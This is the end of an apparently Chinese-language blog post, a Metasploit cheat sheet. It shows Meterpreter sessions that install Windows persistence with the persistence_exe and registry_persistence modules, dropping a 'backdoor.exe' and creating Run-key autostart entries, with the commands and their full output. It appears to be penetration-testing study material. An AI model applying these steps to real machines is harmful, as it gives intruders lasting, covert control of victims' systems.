as USER, SYSTEM, or SERVICE. USER </span><br><span class="line">  will start on user login, SYSTEM will start on system boot but </span><br><span class="line">  requires privs. SERVICE will create a new service which will start </span><br><span class="line">  the payload. Again requires privs.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Module options (post/windows/manage/persistence_exe):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   REXENAME  default.exe      yes       The name to call exe on remote system</span><br><span class="line">   REXEPATH                   yes       The remote executable to upload and execute.</span><br><span class="line">   SESSION                    yes       The session to run this module on.</span><br><span class="line">   STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)</span><br></pre></td></tr></table></figure>

此模块将可执行文件上载到远程主机并进行创建持久性。<br>涉及到四个参数<ul>
<li>REXENAME是拷贝到目标系统中的名字</li>
<li>EXEPATH是将要上传的后门在本地的位置</li>
<li>SESSION是选择运行此模块的会话</li>
<li>STARTUP是启动类型，有USER、SYSTEM、SERVICE这三种取值，USER表示为将在用户登录时启动，SYSTEM表示将在系统启动时启动(需要权限)，SERVICE表示将创建一个启动服务项(需要权限)。</li>
</ul>
尝试一下：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/manage/persistence_exe REXENAME=backdoor.exe REXEPATH=/home/ubuntu/shell.exe STARTUP=USER</span><br><span class="line"></span><br><span class="line">[*] Running module against SAUCERMAN</span><br><span class="line">[*] Reading Payload from file /home/ubuntu/shell.exe</span><br><span class="line">[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\backdoor.exe</span><br><span class="line">[*] Executing script C:\Users\TideSec\AppData\Local\Temp\backdoor.exe</span><br><span class="line">[+] Agent executed with PID 3684</span><br><span class="line">[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI</span><br><span class="line">[+] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI</span><br><span class="line">[*] Cleanup Meterpreter RC File: /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.1023/SAUCERMAN_20190612.1023.rc</span><br></pre></td></tr></table></figure>

4.registry_persistence完整路径为exploit/windows/local/registry_persistence和第一种方法类似，此模块将会安装一个payload到注册表的启动项中。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 13...</span><br><span class="line">msf5 auxiliary(server/socks5) &gt; use exploit/windows/local/registry_persistence</span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/registry_persistence):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   BLOB_REG_KEY                    no        The registry key to use for storing the payload blob. (Default: random)</span><br><span class="line">   BLOB_REG_NAME                   no        The name to use for storing the payload blob. (Default: random)</span><br><span class="line">   CREATE_RC      true             no        Create a resource file for cleanup</span><br><span class="line">   RUN_NAME                        no        The name to use for the &#x27;Run&#x27; key. (Default: random)</span><br><span class="line">   SESSION                         yes       The session to run this module on.</span><br><span class="line">   SLEEP_TIME     0                no        Amount of time to sleep (in seconds) before executing payload. (Default: 0)</span><br><span class="line">   STARTUP        USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; set SESSION 13</span><br><span class="line">SESSION =&gt; 13</span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Generating payload blob..</span><br><span class="line">[+] Generated payload, 6048 bytes</span><br><span class="line">[*] Root path is HKCU</span><br><span class="line">[*] Installing payload blob..</span><br><span class="line">[+] Created registry key HKCU\Software\0BaG3zDR</span><br><span class="line">[+] Installed payload blob to HKCU\Software\0BaG3zDR\iiEB4InD</span><br><span class="line">[*] Installing run key</span><br><span class="line">[+] Installed run key HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SMPqA5kB</span><br><span class="line">[*] Clean up Meterpreter RC file: /home/ubuntu/.msf4/logs/persistence/192.168.81.154_20190612.2138/192.168.81.154_20190612.2138.rc</span><br></pre></td></tr></table></figure>

同类型的还有其他payload，如exploit/windows/local/vss_persistence，exploit/windows/local/s4u_persistence。<h2 id="参考-5"><a href="#参考-5" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2536">https://xz.aliyun.com/t/2536</a></li>
<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/164525">https://www.anquanke.com/post/id/164525</a></li>
<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/118714.html">访问的文章审核中… - FreeBuf网络安全行业门户</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">John Doe</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2022/04/05/MSF备忘录/">http://example.com/2022/04/05/MSF备忘录/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2022/05/07/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BD%91%E5%88%83%E6%9D%AFweb/"><i class="fa fa-chevron-left">  </i><span>第二届网刃杯web部分</span></a></div><div class="next-post pull-right"><a href="/2022/04/01/2022DASCTF%20X%20SU%20%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B/"><span>2022DASCTF X SU 三月春季挑战赛</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://cdn.eso.org/images/screen/eso0932a.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2023 By John Doe</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>Powered by</span> <a target="_blank" rel="noopener" href="https://github.com/wzpan/hexo-generator-search" style="color:#49B1F5;">hexo-generator-search</a></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>